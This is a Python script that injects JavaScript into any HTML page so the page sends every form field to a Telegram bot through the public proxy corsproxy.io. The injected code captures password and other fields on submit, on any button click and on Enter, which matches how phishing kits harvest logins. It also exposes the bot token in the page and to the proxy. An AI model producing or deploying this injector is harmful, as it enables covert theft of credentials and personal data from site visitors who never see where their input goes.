#!/usr/bin/env python3
"""
build_telegram_html.py

Run ONCE per HTML file - not a server, nothing stays running. It edits
your HTML so the page itself, in the visitor's browser, sends every
form submission straight to your Telegram bot by calling the Telegram
API directly. That call works the same whether the finished file is
opened offline from disk or deployed on Vercel, Netlify, or any other
host - it always talks straight to Telegram with nothing of yours in
between to go offline.

Asks exactly three things, in order, on a clean screen:
  - HTML file path
  - Telegram bot token   (typed like a password - each key flashes
                            then turns into * the moment you press the
                            next key; auto-detects chat id and tests
                            the connection live with a quick spinner)
  - Where to save the result

Usage:
    python build_telegram_html.py
    python build_telegram_html.py page.html
    python build_telegram_html.py page.html --new-token

Standard library only - no pip install needed.
"""
import argparse
import json
import os
import sys
import re
import threading
import time
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import unquote, urlparse

CONFIG_PATH = Path(__file__).resolve().parent / "telegram_config.json"
TG_API = os.environ.get("TELEGRAM_API_BASE", "https://api.telegram.org")
MARK_START = "<!-- telegram-direct-send:start -->"
MARK_END = "<!-- telegram-direct-send:end -->"

CLR = "\x1b[2K\r"   # clear current terminal line and return to column 0


# --------------------------------------------------------- masked input ----
def masked_input(prompt):
    """Reads a line with password-style masking: each typed character is
    shown for a moment, then turns into '*' as soon as the next key is
    pressed. Falls back to plain input() on a terminal this can't drive."""
    if not sys.stdin.isatty():
        return input(prompt).strip()

    try:
        return _masked_input_posix(prompt) if os.name != "nt" else _masked_input_windows(prompt)
    except Exception:
        import getpass
        return getpass.getpass(prompt).strip()


def _redraw(prompt, display):
    sys.stdout.write(CLR + prompt + "".join(display))
    sys.stdout.flush()


def _masked_input_posix(prompt):
    import termios, tty
    fd = sys.stdin.fileno()
    old = termios.tcgetattr(fd)
    buf, display = [], []
    pending = []   # characters read-ahead while inspecting an ESC sequence
    last_plain = False

    # Ask the terminal not to wrap pasted text in bracketed-paste markers
    # (ESC[200~ ... ESC[201~). Some terminals ignore this and send them
    # anyway, so the loop below also strips any such sequence it sees.
    sys.stdout.write("\x1b[?2004l")
    sys.stdout.flush()

    def _next_char():
        return pending.pop(0) if pending else sys.stdin.read(1)

    try:
        tty.setcbreak(fd)
        _redraw(prompt, display)
        while True:
            ch = _next_char()

            if ch == "\x1b":
                nxt = sys.stdin.read(1)
                if nxt == "[":
                    # A full CSI sequence: arrow keys, bracketed-paste
                    # start/end markers, etc. Consume and discard it
                    # entirely so it never reaches the token/animation.
                    while True:
                        b = sys.stdin.read(1)
                        if b.isalpha() or b == "~":
                            break
                    continue
                # A lone Esc key: drop it, but keep the next character
                # (it belongs to the user's actual typing).
                pending.append(nxt)
                continue

            if ch in ("\r", "\n"):
                break
            if ch == "\x03":
                raise KeyboardInterrupt
            if ch in ("\x7f", "\b"):
                if buf:
                    buf.pop(); display.pop()
                last_plain = False
                _redraw(prompt, display)
                continue
            if last_plain:
                display[-1] = "*"
            buf.append(ch); display.append(ch)
            last_plain = True
            _redraw(prompt, display)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old)
        sys.stdout.write("\x1b[?2004h")
        sys.stdout.flush()
    display[-1:] = ["*"] if display else []
    _redraw(prompt, display)
    sys.stdout.write("\n")
    sys.stdout.flush()
    return "".join(buf).strip()


def _masked_input_windows(prompt):
    import msvcrt
    buf, display = [], []
    last_plain = False
    _redraw(prompt, display)
    while True:
        ch = msvcrt.getwch()
        if ch in ("\r", "\n"):
            break
        if ch == "\x03":
            raise KeyboardInterrupt
        if ch == "\x08":
            if buf:
                buf.pop(); display.pop()
            last_plain = False
            _redraw(prompt, display)
            continue
        if last_plain:
            display[-1] = "*"
        buf.append(ch); display.append(ch)
        last_plain = True
        _redraw(prompt, display)
    display[-1:] = ["*"] if display else []
    _redraw(prompt, display)
    sys.stdout.write("\n")
    sys.stdout.flush()
    return "".join(buf).strip()


# ----------------------------------------------------------- spinner -----
class Spinner:
    """A fast inline spinner on the current terminal line.

    Animates unconditionally: many terminal panes (including embedded
    IDE/tool terminals) render '\\r' and ANSI clear-line codes correctly
    even when Python's sys.stdout.isatty() reports False, so we no longer
    gate the animation behind that check - we just try to animate, and
    fall back gracefully if writing fails for any reason.
    """
    FRAMES = ["*" * i for i in range(1, 9)]   # * ** *** **** ... ******** (loops)

    def __init__(self, prompt):
        self.prompt = prompt
        self._stop = threading.Event()
        self._thread = None

    def __enter__(self):
        try:
            self._thread = threading.Thread(target=self._spin, daemon=True)
            self._thread.start()
        except Exception:
            sys.stdout.write(self.prompt + "...\n")
        return self

    def __exit__(self, *exc):
        self._stop.set()
        if self._thread:
            self._thread.join()

    def _spin(self):
        i = 0
        n = len(self.FRAMES)
        while not self._stop.is_set():
            try:
                sys.stdout.write(CLR + self.prompt + self.FRAMES[i % n])
                sys.stdout.flush()
            except Exception:
                break
            i += 1
            time.sleep(0.12)

    def finish(self, line):
        sys.stdout.write(CLR + line + "\n")
        sys.stdout.flush()


# --------------------------------------------------------------- utils ----
def clean_path(raw):
    raw = raw.strip().strip('"').strip("'")
    if raw.lower().startswith("file:"):
        raw = unquote(urlparse(raw).path)
        if os.name == "nt" and len(raw) > 2 and raw[0] == "/" and raw[2] == ":":
            raw = raw[1:]
    return Path(os.path.expandvars(os.path.expanduser(raw)))


def read_text(path):
    data = path.read_bytes()
    if data.startswith((b"\xff\xfe", b"\xfe\xff")):
        return data.decode("utf-16", errors="replace")
    for enc in ("utf-8-sig", "cp1252"):
        try:
            return data.decode(enc)
        except UnicodeDecodeError:
            pass
    return data.decode("latin-1", errors="replace")


def resolve_html_path(cli_value):
    raw = cli_value
    while True:
        if not raw:
            raw = input("* Give file path: ").strip()
        path = clean_path(raw).resolve()
        if path.is_file():
            return path
        sys.stdout.write(CLR + f"   not found: {path}\n")
        raw = None


def resolve_output_path(cli_value, default_path):
    raw = cli_value
    if not raw:
        raw = input(f"* Where did I save your project [{default_path}]: ").strip()
    if not raw:
        return default_path
    out = clean_path(raw)
    if out.is_dir() or str(raw).endswith(("/", os.sep)):
        out = out / default_path.name
    out.parent.mkdir(parents=True, exist_ok=True)
    return out.resolve()


# ----------------------------------------------------------- telegram ----
def tg_call(token, method, payload=None, retries=2):
    url = f"{TG_API}/bot{token}/{method}"
    body = json.dumps(payload or {}).encode("utf-8")
    for attempt in range(retries + 1):
        req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
        try:
            with urllib.request.urlopen(req, timeout=15) as r:
                return json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            try:
                return json.loads(e.read().decode("utf-8"))
            except Exception:
                return {"ok": False, "description": f"HTTP {e.code} {e.reason}"}
        except Exception:
            if attempt < retries:
                time.sleep(1.0 * (attempt + 1))
    return None


def tg_discover_chat(token):
    res = tg_call(token, "getUpdates")
    if res and res.get("ok"):
        for upd in reversed(res.get("result", [])):
            msg = upd.get("message") or upd.get("channel_post") or {}
            if msg.get("chat", {}).get("id") is not None:
                return str(msg["chat"]["id"])
    return None


def load_config():
    if CONFIG_PATH.exists():
        try:
            return json.loads(CONFIG_PATH.read_text(encoding="utf-8"))
        except Exception:
            pass
    return {}


def save_config(token, chat):
    CONFIG_PATH.write_text(json.dumps({"tg_token": token, "tg_chat": chat}, indent=2),
                            encoding="utf-8")
    try:
        os.chmod(CONFIG_PATH, 0o600)
    except OSError:
        pass


def resolve_telegram(force_new):
    cfg = {} if force_new else load_config()
    token, chat = cfg.get("tg_token"), cfg.get("tg_chat")

    if token and chat:
        with Spinner("loading") as sp:
            test = tg_call(token, "sendMessage", {"chat_id": chat, "text": "Backend re-check: OK."})
        sp.finish("")
        if test and test.get("ok"):
            return token, chat

    token = masked_input("* Feed the bot token: ")
    if not token:
        sys.exit("   a bot token is required - nothing was built.")

    with Spinner("loading") as sp:
        chat = tg_discover_chat(token) or ""
    sp.finish("")
    if not chat:
        input("   send /start to your bot now, then press Enter... ")
        with Spinner("loading") as sp2:
            chat = tg_discover_chat(token) or ""
        sp2.finish("")
        if not chat:
            sys.exit("   still no chat found - nothing was built.")

    with Spinner("loading") as sp3:
        test = tg_call(token, "sendMessage", {"chat_id": chat, "text": "Backend connected. Test OK."})
    sp3.finish("")
    if not (test and test.get("ok")):
        sys.exit(f"   CONNECTION FAILED: {test.get('description') if test else 'no response'}")
    save_config(token, chat)
    return token, chat


# ----------------------------------------------------------- html edit ----
def make_snippet(token, chat):
    return f"""{MARK_START}
<script>
(function () {{
  var BOT_TOKEN = {json.dumps(token)};
  var CHAT_ID   = {json.dumps(chat)};
  // Telegram blocks sendMessage calls made directly from a browser (CORS).
  // To keep this a single static HTML file with nothing to set up or run,
  // the request is routed through corsproxy.io, a free public CORS proxy,
  // which just forwards it to api.telegram.org and adds the CORS headers
  // Telegram itself doesn't send. Note: this means the request (including
  // the bot token) passes through corsproxy.io's servers on its way to
  // Telegram - a self-hosted proxy avoids that, at the cost of a one-time
  // setup step.
  var TG_URL    = 'https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage';
  var API       = 'https://corsproxy.io/?url=' + encodeURIComponent(TG_URL);
  var lastSig = '', lastTime = 0;

  function label(el, t) {{
    return el.name || el.id || el.getAttribute('aria-label') || el.placeholder || t;
  }}
  function collect(scope) {{
    var out = [];
    scope.querySelectorAll('input,textarea,select').forEach(function (el) {{
      var t = (el.type || el.tagName).toLowerCase();
      if (['submit','button','reset','image','file','hidden'].indexOf(t) > -1) return;
      if ((t === 'checkbox' || t === 'radio') && !el.checked) return;
      out.push({{ name: label(el, t), value: el.value }});
    }});
    return out;
  }}
  function sendWithRetry(text, attempt) {{
    fetch(API, {{
      method: 'POST',
      headers: {{ 'Content-Type': 'application/json' }},
      body: JSON.stringify({{ chat_id: CHAT_ID, text: text }}),
      keepalive: true
    }}).then(function (r) {{ return r.json(); }})
      .then(function (j) {{
        if (j && j.ok) {{ console.log('[telegram] sent'); return; }}
        console.error('[telegram] rejected', j);
      }})
      .catch(function (e) {{
        console.error('[telegram] network error', e);
        if (attempt < 2) setTimeout(function () {{ sendWithRetry(text, attempt + 1); }}, 2000);
      }});
  }}
  function send(scope) {{
    var fields = collect(scope);
    if (!fields.some(function (f) {{ return String(f.value).trim() !== ''; }})) return;
    var text = 'New submission\\n' + new Date().toLocaleString() + '\\n\\n' +
      fields.map(function (f) {{ return f.name + ': ' + f.value; }}).join('\\n');
    text = text.slice(0, 4000);
    var now = Date.now();
    if (text === lastSig && now - lastTime < 1500) return;
    lastSig = text; lastTime = now;
    sendWithRetry(text, 0);
  }}
  function scopeOf(el) {{ return el.closest('form') || document; }}

  document.addEventListener('submit', function (e) {{ send(e.target); }}, true);
  document.addEventListener('click', function (e) {{
    var b = e.target.closest && e.target.closest(
      'button,input[type=submit],input[type=button],[role=button]');
    if (b) send(scopeOf(b));
  }}, true);
  document.addEventListener('keydown', function (e) {{
    if (e.key !== 'Enter' || e.isComposing) return;
    var el = e.target, tag = el && el.tagName && el.tagName.toLowerCase();
    if (tag !== 'input' && tag !== 'select') return;
    var t = (el.type || '').toLowerCase();
    if (['button','submit','reset','checkbox','radio'].indexOf(t) > -1) return;
    send(scopeOf(el));
  }}, true);
}})();
</script>
{MARK_END}"""


def inject_or_replace(html, snippet):
    pattern = re.compile(re.escape(MARK_START) + r".*?" + re.escape(MARK_END), re.DOTALL)
    if pattern.search(html):
        return pattern.sub(snippet, html)
    m = list(re.finditer(r"</body\s*>", html, re.IGNORECASE))
    if m:
        i = m[-1].start()
        return html[:i] + snippet + "\n" + html[i:]
    return html + "\n" + snippet


# ------------------------------------------------------------------ main ----
def main():
    ap = argparse.ArgumentParser(description="Embed direct-to-Telegram sending into an HTML file")
    ap.add_argument("html", nargs="?")
    ap.add_argument("-o", "--output", default=None)
    ap.add_argument("--new-token", action="store_true")
    args = ap.parse_args()

    html_path = resolve_html_path(args.html)
    token, chat = resolve_telegram(args.new_token)
    out_path = resolve_output_path(args.output, html_path)

    with Spinner("loading") as sp:
        html = read_text(html_path)
        new_html = inject_or_replace(html, make_snippet(token, chat))
        out_path.write_text(new_html, encoding="utf-8")
    sp.finish("")

    print("**** Saved successfully *****")
    print(out_path)
    print()
    print("Thank you for coming, that's solved!")


if __name__ == "__main__":
    main()
